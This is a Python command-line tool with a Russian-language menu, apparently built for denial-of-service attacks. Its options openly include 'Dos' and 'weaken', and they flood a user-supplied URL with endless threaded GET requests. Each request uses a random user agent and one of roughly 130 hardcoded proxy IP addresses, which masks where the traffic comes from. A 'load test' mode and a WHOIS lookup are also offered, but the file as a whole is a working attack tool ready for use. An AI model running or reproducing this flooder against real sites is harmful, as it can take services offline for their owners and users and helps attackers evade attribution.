import threading
import requests
from colorama import init, Fore, Style
import os
import time
import signal
import sys
import random
import whois


init(autoreset=True)

class Colors:
    RED = Fore.RED
    CYAN = Fore.CYAN
    BLUE = Fore.BLUE
    GREEN = Fore.GREEN
    RESET = Style.RESET_ALL

BANNER = r""" 
   ██████╗ ██████╗  ██████╗ ███╗   ███╗
   ██╔══██╗██╔══██╗██╔═══██╗████╗ ████║
   ██║  ██║██████╔╝██║   ██║██╔████╔██║
   ██║  ██║██╔══██╗██║   ██║██║╚██╔╝██║
   ██████╔╝██║  ██║╚██████╔╝██║ ╚═╝ ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"""

print_lock = threading.Lock()
stop_threads = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Safari/602.4.8",
]

PROXIES = [
    {"http": "http://185.221.160.123:80"},
    {"http": "http://45.8.211.90:80"},
    {"http": "http://62.182.204.81:88"},
    {"http": "http://178.218.44.79:3128"},
    {"http": "http://31.43.179.136:80"},
    {"http": "http://31.43.179.247:80"},
    {"http": "http://195.137.167.62:80"},
    {"http": "http://195.137.167.25:80"},
    {"http": "http://62.33.207.202:80"},
    {"http": "http://5.189.184.147:27191"},
    {"http": "http://50.221.74.130:80"},
    {"http": "http://172.67.43.209:80"},
    {"http": "http://178.48.68.61:18080"},
    {"http": "http://117.250.3.58:8080"},
    {"http": "http://172.67.181.106:80"},
    {"http": "http://172.67.181.108:80"},
    {"http": "http://172.67.181.150:80"},
    {"http": "http://172.67.182.159:80"},
    {"http": "http://172.67.3.64:80"},
    {"http": "http://185.162.228.223:80"},
    {"http": "http://172.67.177.157:80"},
    {"http": "http://45.12.30.1:80"},
    {"http": "http://185.162.229.78:80"},
    {"http": "http://31.43.179.237:80"},
    {"http": "http://172.67.172.174:80"},
    {"http": "http://172.67.0.21:80"},
    {"http": "http://172.67.73.212:80"},
    {"http": "http://172.67.75.187:80"},
    {"http": "http://172.67.43.190:80"},
    {"http": "http://172.67.192.8:80"},
    {"http": "http://31.43.179.83:80"},
    {"http": "http://172.67.201.224:80"},
    {"http": "http://172.67.24.126:80"},
    {"http": "http://63.141.128.17:80"},
    {"http": "http://67.201.33.10:25283"},
    {"http": "http://172.67.75.35:80"},
    {"http": "http://172.67.182.137:80"},
    {"http": "http://172.67.207.187:80"},
    {"http": "http://172.67.180.50:80"},
    {"http": "http://172.67.177.11:80"},
    {"http": "http://185.162.229.10:80"},
    {"http": "http://185.162.230.49:80"},
    {"http": "http://185.162.228.104:80"},
    {"http": "http://45.12.31.2:80"},
    {"http": "http://185.162.228.52:80"},
    {"http": "http://141.193.213.20:80"},
    {"http": "http://185.238.228.178:80"},
    {"http": "http://141.101.120.235:80"},
    {"http": "http://63.141.128.169:80"},
    {"http": "http://45.131.4.207:80"},
    {"http": "http://63.141.128.243:80"},
    {"http": "http://5.182.34.67:80"},
    {"http": "http://172.67.182.62:80"},
    {"http": "http://172.67.181.124:80"},
    {"http": "http://185.162.228.158:80"},
    {"http": "http://45.12.30.228:80"},
    {"http": "http://185.162.230.112:80"},
    {"http": "http://45.12.30.120:80"},
    {"http": "http://185.162.228.89:80"},
    {"http": "http://31.43.179.230:80"},
    {"http": "http://172.67.171.208:80"},
    {"http": "http://172.67.170.33:80"},
    {"http": "http://172.67.179.182:80"},
    {"http": "http://172.67.179.188:80"},
    {"http": "http://141.101.120.172:80"},
    {"http": "http://141.101.121.70:80"},
    {"http": "http://141.101.121.160:80"},
    {"http": "http://141.101.122.167:80"},
    {"http": "http://141.101.122.132:80"},
    {"http": "http://63.141.128.14:80"},
    {"http": "http://45.131.4.17:80"},
    {"http": "http://45.131.4.47:80"},
    {"http": "http://172.67.68.68:80"},
    {"http": "http://63.141.128.78:80"},
    {"http": "http://172.67.161.211:80"},
    {"http": "http://5.182.34.109:80"},
    {"http": "http://188.114.98.233:80"},
    {"http": "http://172.67.181.122:80"},
    {"http": "http://172.67.176.135:80"},
    {"http": "http://185.162.228.65:80"},
    {"http": "http://172.67.193.136:80"},
    {"http": "http://31.43.179.28:80"},
    {"http": "http://31.43.179.33:80"},
    {"http": "http://172.67.0.42:80"},
    {"http": "http://172.67.43.79:80"},
    {"http": "http://172.67.43.80:80"},
    {"http": "http://172.67.185.158:80"},
    {"http": "http://172.67.81.185:80"},
    {"http": "http://172.67.255.64:80"},
    {"http": "http://172.64.98.128:80"},
    {"http": "http://141.101.120.94:80"},
    {"http": "http://141.101.120.252:80"},
    {"http": "http://141.101.121.135:80"},
    {"http": "http://45.131.4.152:80"},
    {"http": "http://63.141.128.1:80"},
    {"http": "http://172.67.31.147:80"},
    {"http": "http://170.114.45.6:80"},
    {"http": "http://5.182.34.240:80"},{"http": "http://50.168.163.179:80"},
    {"http": "http://50.172.39.98:80"},
    {"http": "http://141.101.123.215:80"},
    {"http": "http://172.67.180.58:80"},
    {"http": "http://172.67.176.16:80"},
    {"http": "http://172.64.194.2:80"},
    {"http": "http://172.67.125.104:80"},
    {"http": "http://172.64.135.33:80"},
    {"http": "http://141.101.121.29:80"},
    {"http": "http://141.101.123.88:80"},
    {"http": "http://172.67.70.117:80"},
    {"http": "http://172.67.70.248:80"},
    {"http": "http://50.174.145.14:80"},
    {"http": "http://172.67.74.181:80"},
    {"http": "http://172.67.182.131:80"},
    {"http": "http://141.101.123.12:80"},
    {"http": "http://172.67.169.199:80"},
    {"http": "http://172.67.181.105:80"},
    {"http": "http://185.162.228.253:80"},
    {"http": "http://185.162.230.2:80"},
    {"http": "http://185.162.228.73:80"},
    {"http": "http://185.162.228.116:80"},
    {"http": "http://185.162.231.25:80"},
    {"http": "http://172.67.184.50:80"},
    {"http": "http://141.101.122.216:80"},
    {"http": "http://172.64.143.25:80"},
    {"http": "http://141.193.213.89:80"},
    {"http": "http://172.67.182.49:80"},
    {"http": "http://172.67.181.94:80"},
    {"http": "http://172.67.181.168:80"}
]

def make_request(url):
    global stop_threads
    if stop_threads:
        return

    headers = {'User-Agent': random.choice(USER_AGENTS)}
    proxy = random.choice(PROXIES) if PROXIES else None

    try:
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        response.raise_for_status()
        with print_lock:
            print(f"{Colors.GREEN}  [+] {response.status_code} {url} (Proxy: {proxy or 'None'}){Colors.RESET}")
    except requests.exceptions.RequestException as e:
        with print_lock:
            print(f"{Colors.RED}  [-] Ошибка: {e} (URL: {url}, Proxy: {proxy or 'None'}){Colors.RESET}")

def signal_handler(sig, frame):
    print(f"\n{Colors.RED}Выход...{Colors.RESET}")
    os.system('cls' if os.name == 'nt' else 'clear')
    exit(0)

def auto_mode():
    global stop_threads
    url = input("    Введите ссылку: ")
    print(f"{Colors.BLUE}Начинаю отправку запросов на {url} (для остановки нажмите Ctrl+C){Colors.RESET}")
    stop_threads = False
    while not stop_threads:
        threading.Thread(target=make_request, args=(url,)).start()
        time.sleep(0.1)

def manual_mode():
    url = input("    Введите ссылку: ")
    try:
        num_requests = int(input("    Введите количество запросов: "))
    except ValueError:
        print(f"{Colors.RED}  Некорректное число запросов.{Colors.RESET}")
        return
    print(f"{Colors.BLUE}  Начинаю отправку {num_requests} запросов на {url}{Colors.RESET}")
    for _ in range(num_requests):
        threading.Thread(target=make_request, args=(url,)).start()
        time.sleep(0.1)

def load_test_mode():
    url = input("    Введите ссылку: ")
    try:
        num_threads = int(input("    Введите количество потоков: "))
        duration = int(input("    Введите длительность теста (в секундах): "))
    except ValueError:
        print(f"{Colors.RED}  Некорректные данные.{Colors.RESET}")
        return

    print(f"{Colors.BLUE}    Запускаю нагрузочный тест на {url} ({num_threads} потоков, {duration} секунд){Colors.RESET}")

    start_time = time.time()
    global stop_threads
    stop_threads = False

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=make_request, args=(url,))
        thread.start()
        threads.append(thread)

    time.sleep(duration)
    stop_threads = True

    for thread in threads:
        thread.join()

    print(f"{Colors.BLUE}    Нагрузочный тест завершен.{Colors.RESET}")

def signal_handler(sig, frame):
    global stop_threads
    print(f"\n{Colors.RED}  Завершение работы...{Colors.RESET}")
    stop_threads = True
    sys.exit(0)

def get_domain_info():
    url = input(f"    Введите URL сайта (например, google.com): ")

    try:
        domain_info = whois.whois(url)
        print(f"{Colors.GREEN}   Информация о домене: {Colors.RESET}")
        for key, value in domain_info.items():
            print(f"  {Colors.CYAN}{key.upper()}:{Colors.RESET} {value}")
    except Exception as e:
        print(f"{Colors.RED}  Ошибка получения информации о домене: {e}{Colors.RESET}")
    input(f"{Colors.CYAN}   Нажмите Enter, чтобы продолжить...{Colors.RESET}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colors.CYAN + BANNER + Colors.RESET)
        print()
        print("    [1] Ослабить ")
        print("    [2] Dos ")
        print("    [3] Нагрузочный тест")
        print("    [4] Информация о домене")
        print("    [0] Выход")

        choice = input(Colors.CYAN + "    Ввод: " + Colors.RESET)

        if choice == '1':
            auto_mode()
        elif choice == '2':
            manual_mode()
        elif choice == '3':
            load_test_mode()
        elif choice == '4':
            get_domain_info()
        elif choice == '0':
            break
        else:
            print(f"{Colors.RED}Неверный выбор. Попробуйте снова.{Colors.RESET}")